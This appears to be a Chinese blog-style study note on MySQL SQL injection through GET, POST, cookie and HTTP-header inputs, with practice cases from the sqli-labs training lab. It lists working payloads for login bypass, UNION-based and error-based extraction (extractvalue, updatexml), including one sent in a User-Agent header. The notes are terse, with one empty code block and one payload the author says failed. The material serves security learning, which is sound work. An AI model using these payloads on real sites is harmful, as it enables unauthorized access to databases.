# 05-mysql提交方式注入

  
# 常见提交方式下的注入漏洞

>前言：WEB应用在数据传递接受中，针对SQL注入安全漏洞，由于数据大小，格式等原因，脚本在接受传递时会有多种传递方式，传递方式的不同将影响到安全测试的不同！本课将针对此类问题进行逐一讲解。


  
## 第一点：数据常见提交方式

`https://www.cnblogs.com/weibanggang/p/9454581.html`





  
## 第二点：产生注入的接受方式

例子：GET
POST：
COOKIE ：
REQUEST ：     $_REQUEST()  何种方法都可以接参数
SERVER： http头部注入。$_SERVER           https://www.cnblogs.com/jianmingyuan/p/5900064.html
等





## 第三点：实战测试案例-sqlilabs关卡

#### post登陆框注入-sqlilabs less13

涉及知识点:   万能密码

Less-13 无回显
Less-11 有回显

```sql
-- 一般是没有括号的，先手工，再工具试试有没有其他符号干扰
-- 可以用hackbar等进行post参数注入

-- 方法1
')or 1=1 -- + 
-- 然后开始按照步骤开始利用 （盲猜  order by 3, 库名，表，列，数据）
admin') union select null,database()#
-- 这里面没回显数据的 地方，想办法让他报错/工具跑
-- sqlmap  post参数是  --data ""

-- 下面的没成功， 可以再试试
admin') union select count(*), concat(select database()) as admin from information_schema.tables group by admin\

-- 报错注入
admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))#


+加号类似空格  


```

#### http头部注入-sqlilabs less18

$_SERVER()

比如站长之家获取我的浏览器的数据，其中http头部可以修改（你懂得）

```sql

```




#### cookie修改注入-sqlilabs less20

无回显  

```sql
-- 大概是这样
User-Agent: admin' or updatexml(1,concat(0x7e,database(),0x7e),0) or '


```

---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/  

